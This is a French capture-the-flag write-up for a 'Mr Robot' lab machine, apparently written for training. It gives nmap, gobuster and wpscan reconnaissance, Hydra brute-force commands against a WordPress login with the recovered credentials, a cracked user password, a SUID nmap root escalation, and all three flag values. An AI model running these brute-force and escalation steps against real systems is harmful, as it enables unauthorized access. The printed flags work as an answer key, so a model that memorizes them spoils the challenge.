# Mr Robot Write-up

## Reconnaissance

### robots.txt

User-agent: *  
fsocity.dic <= Wordlist qui nous servira  
key-1-of-3.txt <= Premier flag

***

## Enumération

### Nmap

#### Commande
`nmap -T4 -sC -sV -Pn -p- 10.10.37.192`

#### Informations

PORT    STATE  SERVICE  VERSION  
22/tcp  closed ssh  
80/tcp  open   http     Apache httpd  
|_http-server-header: Apache  
|_http-title: Site doesn't have a title (text/html).  
443/tcp open   ssl/http Apache httpd  
|_http-server-header: Apache  
|_http-title: Site doesn't have a title (text/html).  
| ssl-cert: Subject: commonName=www.example.com  
| Not valid before: 2015-09-16T10:45:03  
|_Not valid after:  2025-09-13T10:45:03  
MAC Address: 02:9D:12:C9:C2:F7 (Unknown)  

***

### Gobuster

#### Commandes
`gobuster dir -u http://10.10.37.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50`

#### Informations
/blog (Status: 301)  
/images (Status: 301)  
/sitemap (Status: 200)  
/rss (Status: 301)  
/login (Status: 302)  
/video (Status: 301)  
/0 (Status: 301)  
/feed (Status: 301)  
/image (Status: 301)  
/atom (Status: 301)  
/wp-content (Status: 301)  
/admin (Status: 301)  
/audio (Status: 301)  
/intro (Status: 200)  
/wp-login (Status: 200)  
/css (Status: 301)  
/rss2 (Status: 301)  
/license (Status: 200)  
/wp-includes (Status: 301)  
/js (Status: 301)  
/Image (Status: 301)  
/rdf (Status: 301)  
/page1 (Status: 301)  
/readme (Status: 200)  
/robots (Status: 200)  

***

### Wappalizer

#### Informations
 
WordPress 4.3.1  
Adobe Analytics  
Google Font API  
Apache HTTP Server  
Google PageSpeed 1.9.32.3  
PHP5.5.29  
MySQL  
jQuery 1.11.3  
Modernizr 2.8.3  
jQuery Migrate  
Google PageSpeed  

***

### WPScan

#### Commande
`wpscan -h http://10.10.37.192/wordpress`

#### Informations

[+] Headers  
 | Interesting Entries:  
 |  - Server: Apache  
 |  - X-Mod-Pagespeed: 1.9.32.3-4523  
 | Found By: Headers (Passive Detection)  
 | Confidence: 100%  

[+] robots.txt found: http://10.10.37.192/robots.txt  
 | Found By: Robots Txt (Aggressive Detection)  
 | Confidence: 100%  

[+] XML-RPC seems to be enabled: http://10.10.37.192/xmlrpc.php  
 | Found By: Direct Access (Aggressive Detection)  
 | Confidence: 100%  
 | References:  
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API  
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner  
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos  
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login  
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access  

[+] The external WP-Cron seems to be enabled: http://10.10.37.192/wp-cron.php  
 | Found By: Direct Access (Aggressive Detection)  
 | Confidence: 60%  
 | References:  
 |  - https://www.iplocation.net/defend-wordpress-from-ddos  
 |  - https://github.com/wpscanteam/wpscan/issues/1299  

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).  
 | Found By: Emoji Settings (Passive Detection)  
 |  - http://10.10.37.192/d40738b.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'  
 | Confirmed By: Meta Generator (Passive Detection)  
 |  - http://10.10.37.192/d40738b.html, Match: 'WordPress 4.3.1'  

[+] WordPress theme in use: twentyfifteen  
 | Location: http://10.10.37.192/wp-content/themes/twentyfifteen/  
 | Last Updated: 2021-03-09T00:00:00.000Z  
 | Readme: http://10.10.37.192/wp-content/themes/twentyfifteen/readme.txt  
 | [!] The version is out of date, the latest version is 2.9  
 | Style URL: http://10.10.37.192/wp-content/themes/twentyfifteen/style.css?ver=4.3.1  
 | Style Name: Twenty Fifteen  
 | Style URI: https://wordpress.org/themes/twentyfifteen/  
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...  
 | Author: the WordPress team  
 | Author URI: https://wordpress.org/  
 |
 | Found By: Css Style In 404 Page (Passive Detection)  
 |
 | Version: 1.3 (80% confidence)  
 | Found By: Style (Passive Detection)  
 |  - http://10.10.37.192/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'  


***

## Brute-force

### SQLMap

#### Commande
`sqlmap -r post_req.txt --current-user`

#### Informations
Pas injectable :(

***

### Hydra

#### Commande
`hydra -L /tmp/fsocity_uniq.dic 10.10.37.192 -p X http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&Log+In:F=Invalid username."`  
`hydra -l elliot -P /tmp/fsocity_uniq.dic 10.10.37.192 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&Log+In:F=is incorrect."`

#### Informations
*La wordlist comprend beaucoup de doublons, on le voit avec `sort fsocity.dic | uniq | wc -l` => 11452 au lieu de ~800000*  
*On enleve les doublons avec la commande suivante : `sort fsocity.dic | uniq > fsocity_uniq.dic`*  

[80][http-post-form] host: 10.10.37.192   login: elliot   password: X  
[80][http-post-form] host: 10.10.37.192   login: Elliot   password: X  
[80][http-post-form] host: 10.10.37.192   login: ELLIOT   password: X  

[80][http-post-form] host: 10.10.37.192   login: elliot   password: ER28-0652

***

## Accès initial

### Identifiant dans /home/robot/password.raw-md5
On crack et on trouve :  
robot:abcdefghijklmnopqrstuvwxyz

## Escalade de privilèges

SUID : `find / -perm -4000 -type f 2>/dev/null`  
=> /usr/local/bin/nmap  
`nmap --interactive`  
`!cat /root/key-3-of-3.txt`

## Flags

- Flag 1 : `073403c8a58a1f80d943455fb30724b9`  
- Flag 2 : `822c73956184f694993bede3eb39f959`  
- Flag 3 : `04787ddef27c3dee1ee161b21670b4e4`  
